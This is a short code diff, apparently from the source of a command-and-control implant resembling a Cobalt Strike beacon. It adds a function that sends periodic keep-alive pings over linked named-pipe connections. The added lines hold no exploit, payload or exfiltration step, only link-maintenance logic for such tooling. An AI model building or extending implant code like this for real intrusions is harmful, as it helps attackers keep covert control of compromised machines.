@@ -253,3 +253,20 @@ void PipeRoute(char* buffer, int length)
 		BeaconOutput(CALLBACK_PIPE_READ, (char*)gRouteAux, size);
 	}
 }
+
+void PingHandle()
+{
+	for(int i = 0; i < MAX_LINKS; i++)
+	{
+		if (!gLinks[i].isOpen)
+			continue;
+
+		if (gLinks[i].lastPingTime >= GetTickCount())
+			continue;
+
+		DWORD now = GetTickCount();
+		gLinks[i].lastPingTime = now + 15000;
+		u_long bid = htonl(gLinks[i].bid);
+		BeaconOutput(CALLBACK_PIPE_PING, (char*)&bid, sizeof(u_long));
+	}
+}
